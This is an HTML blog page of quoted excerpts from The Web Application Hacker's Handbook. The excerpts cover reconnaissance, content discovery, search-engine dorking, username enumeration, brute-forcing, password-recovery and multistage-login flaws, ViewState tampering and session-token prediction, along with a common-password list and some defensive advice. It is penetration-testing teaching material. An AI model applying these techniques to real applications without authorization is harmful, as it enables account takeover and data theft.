@@ -1,0 +1,645 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+        <title>The Web Application Hacker&#39;s Handbook &larr; We Can Solve This</title>
+        <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible" >
+        <link href="/atom.xml" rel="alternate" title="We Can Solve This - Atom" type="application/atom+xml">
+        <link href="/feed.rss" rel="alternate" title="We Can Solve This - RSS" type="application/rss+xml">
+
+        <link href='http://fonts.googleapis.com/css?family=Amiri|Muli' rel='stylesheet' type='text/css'>
+        <link href="/css/style.css" type="text/css" rel="stylesheet" />
+
+        <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+        <link rel="manifest" href="/manifest.json" />
+        <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5" />
+        <meta name="theme-color" content="#ffffff" />
+
+        <script type="text/javascript" src="/js/baseline.js"></script>
+        </head>
+        <body>
+
+    <header>
+      <h1>The Web Application Hacker's Handbook</h1>
+    </header>
+
+    <div id="boxes">
+    <div id="flex">
+    <div id="nav">
+      <ul>
+        <li><a href="/blog/archives">Essays</a></li>
+        <li><a href="/about">About</a></li>
+        <li><a href="/now">Now</a></li>
+        <li><a href="https://reasonablypolymorphic.com/erdos">Erdos Project</a></li>
+        <li><a href="/top-posts">Best Of</a></li>
+        <li><a href="/book-reviews">Book Reviews</a></li>
+        <li><a href="/books">Book Quotes</a></li>
+      </ul>
+
+      <p>Built with love by Sandy Maguire.</p>
+      <p>&copy; 2011-2020</p>
+    </div>
+    <div id="main">
+      <div class="content">
+
+         <div class="meta">Stuttard, Dafydd</div>
+
+<article>
+    <p>When you are attacking a web application, you should invest a significant amount of attention to the various authentication-related functions it contains. Surprisingly frequently, defects in this functionality enable you to gain unauthorized access to sensitive data and functionality</p>
+    <hr class="chill" />
+    <p>Probing for these vulnerabilities is often laborious, because essentially the same checks need to be repeated for each item of functionality. Because of the prevalence of access control flaws, however, this effort is always a worthwhile investment when you are attacking a web application. Chapter 8 describes how you can automate some of the effort involved in performing rigorous access control testing. Handling</p>
+    <hr class="chill" />
+    <p>Probing for these vulnerabilities is often laborious, because essentially the same checks need to be repeated for each item of functionality. Because of the prevalence of access control flaws, however, this effort is always a worthwhile investment when you are attacking a web application. Chapter 8 describes how you can automate some of the effort involved in performing rigorous access control testing.</p>
+    <hr class="chill" />
+    <p>the principal task is to closely examine every aspect of its behavior, its core security mechanisms, and the technologies being employed (on both the client and server). This will enable you to identify the key attack surface that the application exposes and hence the most interesting areas where you should target subsequent probing to find exploitable vulnerabilities. Often the analysis exercise can uncover vulnerabilities by itself, as discussed later in the chapter.</p>
+    <hr class="chill" />
+    <p>Many web servers contain a file named robots.txt in the web root that contains a list of URLs that the site does not want web spiders to visit or search engines to index. Sometimes, this file contains references to sensitive functionality, which you are certainly interested in spidering. Some spidering tools designed for attacking web applications check for the robots.txt file and use all URLs within it as seeds in the spidering process. In this case, the robots.txt file may be counterproductive to the security of the web application.</p>
+    <hr class="chill" />
+    <p>Backup copies of live files. In the case of dynamic pages, their file extension may have changed to one that is not mapped as executable, enabling you to review the page source for vulnerabilities that can then be exploited on the live page.</p>
+    <hr class="chill" />
+    <p>Burp Intruder can be used to iterate through a list of common directory names and capture details of the server&#39;s responses, which can be reviewed to identify valid directories. Figure 4.4 shows Burp Intruder being configured to probe for common directories residing at the web root.</p>
+    <hr class="chill" />
+    <p>Do not assume that the application will respond with 200 OK if a requested resource exists and 404 Not Found if it does not.</p>
+    <hr class="chill" />
+    <p>Make some manual requests for known valid and invalid resources, and identify how the server handles the latter.</p>
+    <hr class="chill" />
+    <p>Use the site map generated through user-directed spidering as a basis for automated discovery of hidden content.</p>
+    <hr class="chill" />
+    <p>Review these lists to identify any naming schemes in use. For example, if there are pages called AddDocument.jsp and ViewDocument.jsp, there may also be pages called EditDocument.jsp and RemoveDocument.jsp. You can often get a feel for developers&#39; naming habits just by reading a few examples. For example, depending on their personal style, developers may be verbose (AddANewUser.asp), succinct (AddUser.asp), use abbreviations (AddUsr.asp), or even be more cryptic (AddU.asp). Getting a feel for the naming styles in use may help you guess the precise names of content you have not already identified.</p>
+    <hr class="chill" />
+    <p>Add to the lists of enumerated items any further potential names conjectured on the basis of the items that you have discovered. Also add to the file extension list common extensions such as txt, bak, src, inc, and old, which may uncover the source to backup versions of live pages. Also add extensions associated with the development languages in use, such as .java and .cs, which may uncover source files that have been compiled into live pages.</p>
+    <hr class="chill" />
+    <p>Search for temporary files that may have been created inadvertently by developer tools and file editors. Examples include the .DS_Store file, which contains a directory index under OS X, file.php∼1, which is a temporary file created when file.php is edited, and the .tmp file extension that is used by numerous software tools.</p>
+    <hr class="chill" />
+    <p>The DirBuster project from OWASP is also a useful resource when performing automated content discovery tasks. It includes large lists of directory names that have been found in the wild, ordered by frequency of occurrence.</p>
+    <hr class="chill" />
+    <p>Perform the same queries on other domain names belonging to the same</p>
+    <hr class="chill" />
+    <p>When querying a search engine, you can use various advanced techniques to maximize the effectiveness of your research. The following suggestions apply to Google. You can find the corresponding queries on other engines by selecting their Advanced Search option.  site:www.wahh-target.com returns every resource within the target site that Google has a reference to. site:www.wahh-target.com login returns all the pages containing the expression login. In a large and complex application, this technique can be used to quickly home in on interesting resources, such as site maps, password reset functions, and administrative menus. link:www.wahh-target.com returns all the pages on other websites and applications that contain a link to the target. This may include links to old content, or functionality that is intended for use only by third parties, such as partner links. related:www.wahh-target.com returns pages that are “similar” to the target and therefore includes a lot of irrelevant material. However, it may also discuss the target on other sites, which may be of interest.</p>
+    <hr class="chill" />
+    <p>Browse to the last page of search results for a given query, and select Repeat the Search with the Omitted Results Included. By default, Google attempts to filter out redundant results by removing pages that it believes are sufficiently similar to others included in the results. Overriding this behavior may uncover subtly different pages that are of interest to you when attacking the application.</p>
+    <hr class="chill" />
+    <p>View the cached version of interesting pages, including any content that is no longer present in the actual application. In some cases, search engine caches contain resources that cannot be directly accessed in the application without authentication or payment.</p>
+    <hr class="chill" />
+    <p>Perform the same queries on other domain names belonging to the same organization, which may contain useful information about the application you are targeting.</p>
+    <hr class="chill" />
+    <p>Another public source of useful information about the target application is any posts that developers and others have made to Internet forums. There are numerous such forums in which software designers and programmers ask and answer technical questions.</p>
+    <hr class="chill" />
+    <p>Compile a list containing every name and e-mail address you can discover relating to the target application and its development. This should include any known developers, names found within HTML source code, names found in the contact information section of the main company website, and any names disclosed within the application itself, such as administrative staff. 2. Using the search techniques described previously, search for each identified name to find any questions and answers they have posted to Internet forums. Review any information found for clues about functionality or vulnerabilities within the target application.</p>
+    <hr class="chill" />
+    <p>Wikto is one of the many free tools that performs these types of scans, additionally containing a configurable brute-force list for content. As shown in Figure 4.9, when used against the Extreme Internet Shopping site, it identifies some directories using its internal wordlist. Because it has a large database of common web application software and scripts, it has also identified the following directory, which an attacker would not discover through automated or user-driven spidering: http://eis/phpmyadmin/</p>
+    <hr class="chill" />
+    <p>Several useful options are available when you run Nikto: 1. If you believe that the server is using a nonstandard location for interesting content that Nikto checks for (such as /cgi/cgi-bin instead of /cgi-bin), you can specify this alternative location using the option –root /cgi/. For the specific case of CGI directories, these can also be specified using the option –Cgidirs. 2. If the site uses a custom “file not found” page that does not return the HTTP 404 status code, you can specify a particular string that identifies this page by using the -404 option.</p>
+    <hr class="chill" />
+    <p>Identify any instances where application functionality is accessed not by requesting a specific page for that function (such as /admin/editUser.jsp) but by passing the name of a function in a parameter (such as /admin.jsp?action=editUser). 2. Modify the automated techniques described for discovering URL-specified content to work on the content-access mechanisms in use within the application. For example, if the application uses parameters that specify servlet and method names, first determine its behavior when an invalid servlet and/or method is requested, and when a valid method is requested with other invalid parameters.</p>
+    <hr class="chill" />
+    <p>Using lists of common debug parameter names (debug, test, hide, source, etc.) and common values (true, yes, on, 1, etc.), make a large number of requests to a known application page or function, iterating through all permutations of name and value. For POST requests, insert the added parameter to both the URL query string and the message body. Burp Intruder can be used to perform this test using multiple payload sets and the “cluster bomb” attack type (see Chapter 14 for more details).</p>
+    <hr class="chill" />
+    <p>All the different locations at which the application processes user-supplied input — every URL, query string parameter, item of POST data, and cookie</p>
+    <hr class="chill" />
+    <p>The parts of the URL that precede the query string are often overlooked as entry points, since they are assumed to be simply the names of directories and files on the server file system. However, in applications that use REST-style URLs, the parts of the URL that precede the query string can in fact function as data parameters and are just as important as entry points for user input as the query string itself.</p>
+    <hr class="chill" />
+    <p>Many applications perform custom logging functions and may log the contents of HTTP headers such as Referer and User-Agent. These headers should always be considered as possible entry points for input-based attacks.</p>
+    <hr class="chill" />
+    <p>By spoofing the User-Agent header for a popular mobile device, you may be able to access a simplified user interface that behaves differently than the primary interface. Since this interface is generated via different code paths within the server-side application, and may have been subjected to less security testing, you may identify bugs such as cross-site scripting that do not exist in the primary application interface.</p>
+    <hr class="chill" />
+    <p>Burp Intruder contains a built-in payload list containing a large number of user agent strings for different types of devices. You can carry out a simple attack that performs a GET request to the main application page supplying different user agent strings and then review the intruder results to identify anomalies that suggest a different user interface is being presented.</p>
+    <hr class="chill" />
+    <p>Any kind of application that provides an API interface for use by non-browser user agents, such as cell phone apps, if the data processed via this interface is shared with the primary web application</p>
+    <hr class="chill" />
+    <p>Many web servers disclose fine-grained version information, both about the web server software itself and about other components that have been installed. For example, the HTTP Server header discloses a huge amount of detail about some installations:</p>
+    <hr class="chill" />
+    <p>Httprecon is a handy tool that performs a number of tests in an attempt to fingerprint a web server&#39;s software.</p>
+    <hr class="chill" />
+    <p>Even if an application does not employ a particular file extension in its published content, it is usually possible to verify whether the technology supporting that extension is implemented on the server. For example, if ASP.NET is installed, requesting a nonexistent .aspx file returns a customized error page generated by the ASP.NET framework,</p>
+    <hr class="chill" />
+    <p>Requesting a nonexistent file with a different extension returns a generic error message generated by the web server,</p>
+    <hr class="chill" />
+    <p>It is possible to detect the presence of each file extension mapping via the different error messages generated when that file extension is requested. In some cases, discovering a particular mapping may indicate the presence of a web server vulnerability. For example, the .printer and .ida/.idq handlers in IIS have in the past been found vulnerable to buffer overflow vulnerabilities.</p>
+    <hr class="chill" />
+    <p>Many web servers and web application platforms generate session tokens by default with names that provide information about the technology in use. For example: JSESSIONID — The Java Platform ASPSESSIONID — Microsoft IIS server ASP.NET_SessionId — Microsoft ASP.NET CFID/CFTOKEN — Cold Fusion PHPSESSID — PHP</p>
+    <hr class="chill" />
+    <p>Perform searches on Google for the names of any unusual cookies, scripts, HTTP headers, and the like that may belong to third-party software components.</p>
+    <hr class="chill" />
+    <p>Having identified a blind SQL injection vulnerability, you may encounter problems exploiting it, because your crafted requests are being modified in unseen ways by the input validation logic.</p>
+    <hr class="chill" />
+    <p>other functions within the application might provide good feedback about the kind of sanitization being performed — for example, a function that echoes some user-supplied data to the browser. You may be able to use this function to test different encodings and variations of your SQL injection payload to determine what raw input must be submitted to achieve the desired attack string after the input validation logic has been applied</p>
+    <hr class="chill" />
+    <p>It may also be possible to reverse-engineer the obfuscation scheme by submitting systematically varying values to the function and monitoring their deobfuscated equivalents.</p>
+    <hr class="chill" />
+    <p>Make a note of any functionality that diverges from the standard GUI appearance, parameter naming, or navigation mechanism used within the rest of the application. 2. Also make a note of functionality that is likely to have been added retrospectively. Examples include debug functions, CAPTCHA controls, usage tracking, and third-party code. 3. Perform a full review of these areas, and do not assume that the standard defenses used elsewhere in the application apply.</p>
+    <hr class="chill" />
+    <p>It may also be possible to find out information about inaccessible resources or to try a wildcard option in pageID, such as pageID=all or pageID=*.</p>
+    <hr class="chill" />
+    <p>An intercepting proxy is tremendously useful when attacking a web application and is the one truly indispensable tool you need. Numerous such tools are available. We will use Burp Suite, which was written by one of this book&#39;s authors.</p>
+    <hr class="chill" />
+    <p>Even if the opaque string is impenetrable, it may be possible to replay its value in other contexts to achieve a malicious effect. For example, the pricing_token parameter in the previously shown form may contain an encrypted version of the product&#39;s price. Although it is not possible to produce the encrypted equivalent for an arbitrary price of your choosing, you may be able to copy the encrypted price from a different, cheaper product and submit this in its place.</p>
+    <hr class="chill" />
+    <p>If all else fails, you can attempt to attack the server-side logic that will decrypt or deobfuscate the opaque string by submitting malformed variations of it — for example, containing overlong values, different character sets, and the like.</p>
+    <hr class="chill" />
+    <p>One commonly encountered mechanism for transmitting opaque data via the client is the ASP.NET ViewState. This is a hidden field that is created by default in all ASP.NET web applications. It contains serialized information about the state of the current page.</p>
+    <hr class="chill" />
+    <p>The ViewState parameter is actually a Base64-encoded string that can be easily decoded to see the price parameter that has been placed there:</p>
+    <hr class="chill" />
+    <p>By default, the ASP.NET platform protects the ViewState from tampering by adding a keyed hash to it (known as MAC protection). However, some applications disable this default protection, meaning that you can modify the ViewState&#39;s value to determine whether it has an effect on the application&#39;s server-side processing.</p>
+    <hr class="chill" />
+    <p>Even if the ViewState is protected, use Burp to decode the ViewState on various application pages to discover whether the application is using the ViewState to transmit any sensitive data via the client.</p>
+    <hr class="chill" />
+    <p>Note that MAC protection may be enabled or disabled on a per-page basis, so it may be necessary to test each significant page of the application for ViewState hacking vulnerabilities. If you are using Burp Scanner with passive scanning enabled, Burp automatically reports any pages that use the ViewState without MAC protection enabled.</p>
+    <hr class="chill" />
+    <p>A neater approach is to enter a benign (known good) value into the input field in the browser, intercept the validated submission with your proxy, and modify the data to your desired value. This is often the easiest and most elegant way to defeat JavaScript-based validation.</p>
+    <hr class="chill" />
+    <p>Reversing: Secrets of Reverse Engineering by Eldad Eilam Hacker Disassembling Uncovered by Kris Kaspersky The Art of Software Security Assessment by Mark Dowd, John McDonald, and Justin Schuh Fuzzing for Software Security Testing and Quality Assurance (Artech House Information Security and Privacy) by Ari Takanen, Jared DeMott, and Charlie Miller The IDA Pro Book: The Unofficial Guide to the World&#39;s Most Popular Disassembler by Chris Eagle</p>
+    <hr class="chill" />
+    <p>The server-side logic that performs validation of client-submitted data should be aware of the validation that has already occurred on the client side. If data that would have been blocked by client-side validation is received, the application may infer that a user is actively circumventing this validation and therefore is likely to be malicious.</p>
+    <hr class="chill" />
+    <p>Anomalies should be logged and, if appropriate, application administrators should be alerted in real time so that they can monitor any attempted attack and take suitable action as required. The application may also actively defend itself by terminating the user&#39;s session or even suspending his account.</p>
+    <hr class="chill" />
+    <p>it is highly likely that an application that does not enforce strong password standards will contain a large number of user accounts with weak passwords set. An attacker can easily guess these account passwords, granting him or her unauthorized access to the application.</p>
+    <hr class="chill" />
+    <p>If password quality rules are enforced only through client-side controls, this is not itself a security issue, because ordinary users will still be protected. It is not normally a threat to an application&#39;s security that a crafty attacker can assign himself a weak password.</p>
+    <hr class="chill" />
+    <p>Recent compromises of high-profile sites have provided access to hundreds of thousands of real-world passwords that were stored either in cleartext or using brute-forcible hashes. Here are the most popular real-world passwords: password website name 12345678 qwerty abc123 111111 monkey 12345 letmein</p>
+    <hr class="chill" />
+    <p>Administrative passwords may in fact be weaker than the password policy allows. They may have been set before the policy was in force, or they may have been set up through a different application or interface</p>
+    <hr class="chill" />
+    <p>Manually submit several bad login attempts for an account you control, monitoring the error messages you receive. 2. After about 10 failed logins, if the application has not returned a message about account lockout, attempt to log in correctly. If this succeeds, there is probably no account lockout policy.</p>
+    <hr class="chill" />
+    <p>Even if an application&#39;s responses to login attempts containing valid and invalid usernames are identical in every intrinsic respect, it may still be possible to enumerate usernames based on the time taken for the application to respond to the login request.</p>
+    <hr class="chill" />
+    <p>Web applications sometimes store user credentials in cookies, usually to implement poorly designed mechanisms for login, password change, “remember me,” and so on. These credentials are vulnerable to capture via attacks that compromise user cookies and, in the case of persistent cookies, by anyone who gains access to the client&#39;s local filesystem. Even if the credentials are encrypted, an attacker still can simply replay the cookie and therefore log in as a user without actually knowing her credentials.</p>
+    <hr class="chill" />
+    <p>In many cases, the application allows users to set their own password recovery challenge and response during registration. Users are inclined to set extremely insecure challenges, presumably on the false assumption that only they will ever be presented with them. An example is “Do I own a boat?”</p>
+    <hr class="chill" />
+    <p>As with password change functionality, application developers commonly overlook the possibility of brute-forcing the response to a password recovery challenge, even when they block this attack on the main login page. If an application allows unrestricted attempts to answer password recovery challenges, it is highly likely to be compromised by a determined attacker.</p>
+    <hr class="chill" />
+    <p>Some applications disclose the existing, forgotten password to the user after successful completion of a challenge, enabling an attacker to use the account indefinitely without any risk of detection by the owner. Even if the account owner subsequently changes the blown password, the attacker can simply repeat the same challenge to obtain the new password.</p>
+    <hr class="chill" />
+    <p>Even if the application does not provide an on-screen field for you to provide an e-mail address to receive the recovery URL, the application may transmit the address via a hidden form field or cookie. This presents a double opportunity: you can discover the e-mail address of the user you have compromised, and you can modify its value to receive the recovery URL at an address of your choosing.</p>
+    <hr class="chill" />
+    <p>Try It! http://mdsec.net/auth/142/ http://mdsec.net/auth/145/ http://mdsec.net/auth/151/</p>
+    <hr class="chill" />
+    <p>Some “remember me” functions are implemented using a simple persistent cookie, such as RememberUser=daf</p>
+    <hr class="chill" />
+    <p>Some “remember me” functions set a cookie that contains not the username but a kind of persistent session identifier, such as RememberUser=1328. When the identifier is submitted to the login page, the application looks up the user associated with it and creates an application session for that user. As with ordinary session tokens, if the session identifiers of other users can be predicted or extrapolated, an attacker can iterate through a large number of potential identifiers to find those associated with application users, and therefore gain access to their accounts without authentication.</p>
+    <hr class="chill" />
+    <p>Try It! http://mdsec.net/auth/219/ http://mdsec.net/auth/224/ http://mdsec.net/auth/227/ http://mdsec.net/auth/229/ http://mdsec.net/auth/232/ http://mdsec.net/auth/236/ http://mdsec.net/auth/239/ http://mdsec.net/auth/245</p>
+    <hr class="chill" />
+    <p>Some applications implement the facility for a privileged user of the application to impersonate other users in order to access data and carry out actions within their user context. For example, some banking applications allow helpdesk operators to verbally authenticate a telephone user and then switch their application session into that user&#39;s context to assist him or her.</p>
+    <hr class="chill" />
+    <p>Some impersonation functionality is implemented as a simple “backdoor” password that can be submitted to the standard login page along with any username to authenticate as that user. This design is highly insecure for many reasons, but the biggest opportunity for attackers is that they are likely to discover this password when performing standard attacks such as brute-forcing of the login. If the backdoor password is matched before the user&#39;s actual password, the attacker is likely to discover the function of the backdoor password and therefore gain access to every user&#39;s account</p>
+    <hr class="chill" />
+    <p>Try It! http://mdsec.net/auth/272/ http://mdsec.net/auth/290/</p>
+    <hr class="chill" />
+    <p>Some applications strip unusual characters (sometimes on the pretext of performing input validation) before checking passwords.</p>
+    <hr class="chill" />
+    <p>Using an account you control, attempt to log in with variations on your own password: removing the last character, changing the case of a character, and removing any special typographical characters. If any of these attempts is successful, continue experimenting to try to understand what validation is actually occurring.</p>
+    <hr class="chill" />
+    <p>Badly designed self-registration functionality can also provide a means for username enumeration. If an application disallows duplicate usernames, an attacker may attempt to register large numbers of common usernames to identify the existing usernames that are rejected.</p>
+    <hr class="chill" />
+    <p>If self-registration is possible, attempt to register the same username twice with different passwords. 2. If the application blocks the second registration attempt, you can exploit this behavior to enumerate existing usernames even if this is not possible on the main login page or elsewhere. Make multiple registration attempts with a list of common usernames to identify the already registered names that the application blocks. 3. If the registration of duplicate usernames succeeds, attempt to register the same username twice with the same password, and determine the application&#39;s behavior:</p>
+    <hr class="chill" />
+    <p>In some applications, users are created all at once or in sizeable batches and are automatically assigned initial passwords, which are then distributed to them through some means. The means of generating passwords may enable an attacker to predict the passwords of other application users. This kind of vulnerability is more common on intranet-based corporate applications — for example, where every employee has an account created on her behalf and receives a printed notification of her password.</p>
+    <hr class="chill" />
+    <p>In the worst case, a security-conscious user who decides to immediately change his possibly compromised password then receives another e-mail containing the new password “for future reference.” This behavior is so bizarre and unnecessary that users would be well advised to stop using web applications that indulge in it.</p>
+    <hr class="chill" />
+    <p>Obtain a new account. If you are not required to set all credentials during registration, determine the means by which the application distributes credentials to new users. 2. If an account activation URL is used, try to register several new accounts in close succession, and identify any sequence in the URLs you receive. If a pattern can be determined, try to predict the activation URLs sent to recent and forthcoming users, and attempt to use these URLs to take ownership of their accounts. 3. Try to reuse a single activation URL multiple times, and see if the application allows this. If not, try locking out the target account before reusing the URL, and see if it now works.</p>
+    <hr class="chill" />
+    <p>Perform a complete, valid login using an account you control. Record every piece of data submitted to the application, and every response received, using your intercepting proxy. 2. Repeat the login process numerous times, modifying pieces of the data submitted in unexpected ways. For example, for each request parameter or cookie sent by the client, do the following: a. Submit an empty string as the value. b. Remove the name/value pair altogether. c. Submit very long and very short values. d. Submit strings instead of numbers and vice versa. e. Submit the same item multiple times, with the same and different values. 3. For each malformed request submitted, review closely the application&#39;s response to identify any divergences from the base case. 4. Feed these observations back into framing your test cases. When one modification causes a change in behavior, try to combine this with other changes to push the application&#39;s logic to its limits.</p>
+    <hr class="chill" />
+    <p>Try It! http://mdsec.net/auth/300/</p>
+    <hr class="chill" />
+    <p>It is often assumed that multistage login mechanisms are less prone to security bypasses than standard username/password authentication. This belief is mistaken. Performing several authentication checks may add considerable security to the mechanism. But counterbalancing this, the process is more prone to flaws in implementation. In several cases where a combination of flaws is present, it can even result in a solution that is less secure than a normal login based on username and password.</p>
+    <hr class="chill" />
+    <p>An application may assume that a user who accesses stage three must have cleared stages one and two. Therefore, it may authenticate an attacker who proceeds directly from stage one to stage three and correctly completes it, enabling an attacker to log in with only one part of the various credentials normally required</p>
+    <hr class="chill" />
+    <p>An application may trust some of the data being processed at stage two because this was validated at stage one. However, an attacker may be able to manipulate this data at stage two, giving it a different value than was validated at stage one.</p>
+    <hr class="chill" />
+    <p>An application may assume that the same user identity is used to complete each stage; however, it might not explicitly check this. For example, stage one might involve submitting a valid username and password, and stage two might involve resubmitting the username (now in a hidden form field) and a value from a changing physical token. If an attacker submits valid data pairs at each stage, but for different users, the application might authenticate the user as either one of the identities used in the two stages.</p>
+    <hr class="chill" />
+    <p>Try It! http://mdsec.net/auth/195/ http://mdsec.net/auth/199/ http://mdsec.net/auth/203/ http://mdsec.net/auth/206/ http://mdsec.net/auth/211</p>
+    <hr class="chill" />
+    <p>Try It! http://mdsec.net/auth/178/</p>
+    <hr class="chill" />
+    <p>Try It! http://mdsec.net/auth/178/ http://mdsec.net/auth/182/</p>
+    <hr class="chill" />
+    <p>In a variation on this scenario, the application may set a persistent cookie to “ensure” that the same varying question is presented to any given user until that person answers it correctly. Of course, this measure can be circumvented easily by modifying or deleting the cookie.</p>
+    <hr class="chill" />
+    <p>Review all of the application&#39;s authentication-related functionality, as well as any functions relating to user maintenance. If you find any instances in which a user&#39;s password is transmitted back to the client, this indicates that passwords are being stored insecurely, either in cleartext or using reversible encryption.</p>
+    <hr class="chill" />
+    <p>If any kind of arbitrary command or query execution vulnerability is identified within the application, attempt to find the location within the application&#39;s database or filesystem where user credentials are stored: a. Query these to determine whether passwords are being stored in unencrypted form. b. If passwords are stored in hashed form, check for nonunique values, indicating that an account has a common or default password assigned, and that the hashes are not being salted. c. If the password is hashed with a standard algorithm in unsalted form, query online hash databases to determine the corresponding cleartext password value.</p>
+    <hr class="chill" />
+    <p>The application should be aggressive in defending itself against unexpected events occurring during login processing. For example, depending on the development language in use, the application should use catch-all exception handlers around all API calls. These should explicitly delete all session and method-local data being used to control the state of the login processing and should explicitly invalidate the current session, thereby causing a forced logout by the server even if authentication is somehow bypassed.</p>
+    <hr class="chill" />
+    <p>The first task carried out at every stage should be to verify that all prior stages have been correctly completed. If this is not the case, the authentication attempt should immediately be marked as bad.</p>
+    <hr class="chill" />
+    <p>To prevent information leakage about which stage of the login failed (which would enable an attacker to target each stage in turn), the application should always proceed through all stages of the login, even if the user failed to complete earlier stages correctly, and even if the original username was invalid. After proceeding through all the stages, the application should present a generic “login failed” message at the conclusion of the final stage, without providing any information about where the failure occurred.</p>
+    <hr class="chill" />
+    <p>The various authentication mechanisms used by the application should not disclose any information about authentication parameters, through either overt messages or inference from other aspects of the application&#39;s behavior. An attacker should have no means of determining which piece of the various items submitted has caused a problem.</p>
+    <hr class="chill" />
+    <p>A single code component should be responsible for responding to all failed login attempts with a generic message. This avoids a subtle vulnerability that can occur when a supposedly uninformative message returned from different code paths can actually be spotted by an attacker due to typographical differences in the message, different HTTP status codes, other information hidden in HTML, and the like.</p>
+    <hr class="chill" />
+    <p>The application can use e-mail addresses as usernames. Here, the first stage of the registration process requires the user to enter her e-mail address, whereupon she is told simply to wait for an e-mail and follow the instructions contained within it. If the e-mail address is already registered, the user can be informed of this in the e-mail. If the address is not already registered, the user can be provided with a unique, unguessable URL to visit to continue the registration process. This prevents the attacker from enumerating valid usernames (unless he happens to have already compromised a large number of e-mail accounts).</p>
+    <hr class="chill" />
+    <p>Some applications that have implemented a suspension policy remain vulnerable to brute-forcing because they continue to fully process login attempts during the suspension period, and they return a subtly (or not so subtly) different message when valid credentials are submitted. This behavior enables an effective brute-force attack to proceed at full speed regardless of the suspension policy.</p>
+    <hr class="chill" />
+    <p>If you are attacking an application that uses CAPTCHA controls to hinder automation, always closely review the HTML source for the page where the image appears. The authors have encountered cases where the solution to the puzzle appears in literal form within the ALT attribute of the image tag, or within a hidden form field, enabling a scripted attack to defeat the protection without actually solving the puzzle itself.</p>
+    <hr class="chill" />
+    <p>Features such as password “hints” should never be used, because they mainly help an attacker trawl for accounts that have obvious hints set.</p>
+    <hr class="chill" />
+    <p>Responses to the challenge should contain sufficient entropy that they cannot be easily guessed. For example, asking the user for the name of his first school is preferable to asking for his favorite color.</p>
+    <hr class="chill" />
+    <p>Users should be notified in-band of frequently occurring security events. For example, after a successful login, the application should inform users of the time and source IP/domain of the last login and the number of invalid login attempts made since then. If a user is made aware that her account is being subjected to a password-guessing attack, she is more likely to change her password frequently and set it to a strong value.</p>
+    <hr class="chill" />
+    <p>The most important lesson when attacking authentication functionality is to look everywhere.</p>
+    <hr class="chill" />
+    <p>In addition to the main login form, there may be functions to register new accounts, change passwords, remember passwords, recover forgotten passwords, and impersonate other users. Each of these presents a rich target of potential defects, and problems that have been consciously eliminated within one function often reemerge within others. Invest the time to scrutinize and probe every inch of attack surface you can find, and your rewards may be great.</p>
+    <hr class="chill" />
+    <p>The vulnerabilities that exist in session management mechanisms largely fall into two categories: Weaknesses in the generation of session tokens Weaknesses in the handling of session tokens throughout their life cycle</p>
+    <hr class="chill" />
+    <p>The application may often employ several different items of data collectively as a token, including cookies, URL parameters, and hidden form fields. Some of these items may be used to maintain session state on different back-end components. Do not assume that a particular parameter is the session token without proving it, or that sessions are being tracked using only one item.</p>
+    <hr class="chill" />
+    <p>Observe which new items are passed to the browser after authentication. Often, new session tokens are created after a user authenticates herself.</p>
+    <hr class="chill" />
+    <p>In cases where a token contains a blob of binary data, much of this data may be padding. Only a small part of it may actually be relevant to the validation that the server performs on the token. Narrowing down the subparts of a token that are actually required can often considerably reduce the amount of apparent entropy and complexity that the token contains.</p>
+    <hr class="chill" />
+    <p>If you find that certain portions of the token are not actually required to be correct, you can exclude these from any further analysis, potentially reducing the amount of work you need to perform. You can use the “char frobber” payload type in Burp Intruder to modify a token&#39;s</p>
+    <hr class="chill" />
+    <p>If you find that certain portions of the token are not actually required to be correct, you can exclude these from any further analysis, potentially reducing the amount of work you need to perform. You can use the “char frobber” payload type in Burp Intruder to modify a token&#39;s value in one character position at a time, to help with this task.</p>
+    <hr class="chill" />
+    <p>Log in as several different users at different times, and record the tokens received from the server. If self-registration is available and you can choose your username, log in with a series of similar usernames containing small variations between them, such as A, AA, AAA, AAAA, AAAB, AAAC, AABA, and so on. If other user-specific data is submitted at login or stored in user profiles (such as an e-mail address), perform a similar exercise to vary that data systematically, and record the tokens received following login.</p>
+    <hr class="chill" />
+    <p>Try It! http://mdsec.net/auth/321/ http://mdsec.net/auth/329/ http://mdsec.net/auth/331/</p>
+    <hr class="chill" />
+    <p>Given our analysis of how tokens are created, it is straightforward to construct a scripted attack to harvest the session tokens that the application issues to other users: We continue polling the server to obtain new session tokens in quick succession. We monitor the increments in the first number. When this increases by more than 1, we know that a token has been issued to another user. When a token has been issued to another user, we know the upper and lower bounds of the second number that was issued to that person, because we possess the tokens that were issued immediately before and after his. Because we are obtaining new session tokens frequently, the range between these bounds will typically consist of only a few hundred values.</p>
+    <hr class="chill" />
+    <p>Try It! http://mdsec.net/auth/339/ http://mdsec.net/auth/340/ http://mdsec.net/auth/347/ http://mdsec.net/auth/351/</p>
+    <hr class="chill" />
+    <p>This algorithm takes the last number generated, multiplies it by a constant, and adds another constant to obtain the next number. The number is truncated to 48 bits, and the algorithm shifts the result to return the specific number of bits requested by the caller. Knowing this algorithm and a single number generated by it, we can easily derive the sequence of numbers that the algorithm will generate next. With a little number theory, we also can derive the sequence that it generated previously. This means that an attacker who obtains a single session token from the server can obtain the tokens of all current and future sessions.</p>
+    <hr class="chill" />
+    <p>in PHP frameworks 5.3.2 and earlier, the session token is generated based on the client&#39;s IP address, epoch time at token creation, microseconds at token creation, and a linear congruential generator.</p>
+    <hr class="chill" />
+    <p>The high-level steps in this process are as follows: 1. Start with the hypothesis that the tokens are randomly generated. 2. Apply a series of tests, each of which observes specific properties of the sample that are likely to have certain characteristics if the tokens are randomly generated. 3. For each test, calculate the probability of the observed characteristics occurring, working on the assumption that the hypothesis is true. 4. If this probability falls below a certain level (the “significance level”), reject the hypothesis and conclude that the tokens are not randomly generated.</p>
+    <hr class="chill" />
+    <p>The good news is you don&#39;t have to do any of this manually! The best tool that is currently available for testing the randomness of web application tokens is Burp Sequencer. This tool applies several standard tests in a flexible way and gives you clear results that are easy to interpret.</p>
+    <hr class="chill" />
